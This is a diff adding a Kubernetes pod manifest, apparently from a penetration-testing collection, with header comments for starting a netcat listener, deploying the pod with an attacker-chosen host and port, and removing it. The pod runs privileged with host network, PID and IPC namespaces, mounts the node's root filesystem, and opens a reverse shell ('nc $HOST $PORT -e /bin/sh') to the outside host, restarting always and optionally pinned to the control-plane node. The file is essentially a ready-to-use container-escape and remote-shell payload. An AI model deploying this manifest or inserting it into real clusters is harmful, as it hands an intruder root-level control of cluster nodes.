@@ -1,0 +1,31 @@
+###########################################################
+## Set up Listener: nc -nvlp [PORT]
+## Deploy: HOST="10.0.0.1" PORT="3116" envsubst < everything-allowed-revshell-pod.yaml | kubectl apply -f - 
+## Remove: Remove: kubectl -n [namespace] delete everything-allowed-revshell-pod
+###########################################################
+apiVersion: v1
+kind: Pod
+metadata:
+  name: everything-allowed-revshell-pod
+  labels:
+    app: pentest
+spec:
+  hostNetwork: true
+  hostPID: true
+  hostIPC: true
+  containers:
+  - name: everything-allowed-revshell-pod
+    image: busybox
+    securityContext:
+      privileged: true
+    volumeMounts:
+    - mountPath: /host
+      name: noderoot
+    command: [ "/bin/sh", "-c", "--" ]
+    args: [ "nc $HOST $PORT  -e /bin/sh;" ]    
+  #nodeName: k8s-control-plane-node # Force your pod to run on the control-plane node by uncommenting this line and changing to a control-plane node name
+  restartPolicy: Always
+  volumes:
+  - name: noderoot
+    hostPath:
+      path: /
